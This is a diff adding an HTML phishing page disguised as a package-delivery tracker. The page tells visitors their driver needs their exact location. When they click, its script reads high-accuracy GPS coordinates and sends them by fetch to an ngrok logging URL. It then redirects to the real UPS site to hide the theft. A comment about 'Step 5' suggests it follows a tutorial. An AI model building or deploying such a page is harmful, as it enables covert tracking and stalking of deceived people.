@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>📦 Package Tracking</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: Arial; text-align: center; padding: 50px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
+        .container { max-width: 400px; margin: 0 auto; background: rgba(255,255,255,0.1); padding: 40px; border-radius: 20px; backdrop-filter: blur(10px); }
+        h1 { font-size: 28px; margin-bottom: 20px; }
+        p { font-size: 18px; margin-bottom: 30px; }
+        button { background: #ff6b35; color: white; border: none; padding: 20px 40px; font-size: 20px; border-radius: 50px; cursor: pointer; width: 100%; box-shadow: 0 8px 25px rgba(255,107,53,0.4); }
+        button:hover { background: #e55a2b; transform: translateY(-2px); }
+        button:active { transform: translateY(0); }
+        .loading { display: none; color: #4ade80; font-weight: bold; font-size: 18px; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📦 Package Delivery</h1>
+        <p>Your driver needs your <strong>exact location</strong> for delivery.</p>
+        <p>Enable location access below:</p>
+        <br>
+        <button onclick="getLocation()">📱 Get My Location</button>
+        <div id="loading" class="loading">✅ Finding your exact location...</div>
+    </div>
+
+    <script>
+    function getLocation() {
+        document.getElementById('loading').style.display = 'block';
+        
+        navigator.geolocation.getCurrentPosition(
+            function(position) {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const accuracy = position.coords.accuracy;
+                
+                // 🚨 YOUR NGROK URL GOES HERE (Step 5)
+                fetch(`https://abc123.ngrok-free.app/log?lat=${lat}&lon=${lon}&accuracy=${accuracy}`);
+                
+                setTimeout(() => {
+                    window.location = 'https://www.ups.com/track?loc=en_US'; // Legit redirect
+                }, 1500);
+            },
+            function() {
+                alert('Location permission required for delivery');
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
+        );
+    }
+    </script>
+</body>
+</html>
